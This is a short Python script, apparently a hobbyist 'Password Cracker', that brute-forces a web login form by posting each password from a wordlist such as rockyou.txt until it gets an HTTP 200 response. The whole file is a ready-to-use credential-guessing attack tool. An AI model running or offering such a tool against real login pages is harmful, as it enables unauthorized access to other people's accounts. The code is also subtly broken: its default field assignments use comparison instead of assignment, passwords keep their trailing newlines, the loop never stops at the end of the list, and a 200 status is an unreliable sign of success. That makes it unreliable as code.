import requests 
import time 
import sys 
import os 


print('''
__________                                               .___
\______   \_____    ______ ________  _  _____________  __| _/
 |     ___/\__  \  /  ___//  ___/\ \/ \/ /  _ \_  __ \/ __ | 
 |    |     / __ \_\___ \ \___ \  \     (  <_> )  | \/ /_/ | 
 |____|    (____  /____  >____  >  \/\_/ \____/|__|  \____ | 
                \/     \/     \/                          \/ 
_________                       __                           
\_   ___ \____________    ____ |  | __ ___________           
/    \  \/\_  __ \__  \ _/ ___\|  |/ // __ \_  __ \          
\     \____|  | \// __ \\  \___|    <\  ___/|  | \/          
 \______  /|__|  (____  /\___  >__|_ \\___  >__|             
        \/            \/     \/     \/    \/              

- By 0xHawwk 
''')


# User Inputs 
url = input("Login Web-address: ")
uname = input("Username: ")
uname_field = input("Username input field: ")
pass_field = input("Password input field: ")
wordlist = input("Wordlist location: ")

# Default fields 
if uname_field == "":
    uname_field == "username"

if pass_field == "":
    pass_field == "password"

if wordlist == "":
    wordlist = "/usr/share/wordlists/rockyou.txt"

# Opening wordlist
pass_list = open(str(wordlist),"r")

# Trying password combination
while True:
    passw = pass_list.readline()
    # Form payloads 
    payload = {

        uname_field: uname,
        pass_field: passw
    }

    # Post login form (HTML)
    r = requests.post(url, data=payload)
    if r.status_code == 200:
        print(str(uname)+":"+str(passw)+" was successful!")
        break
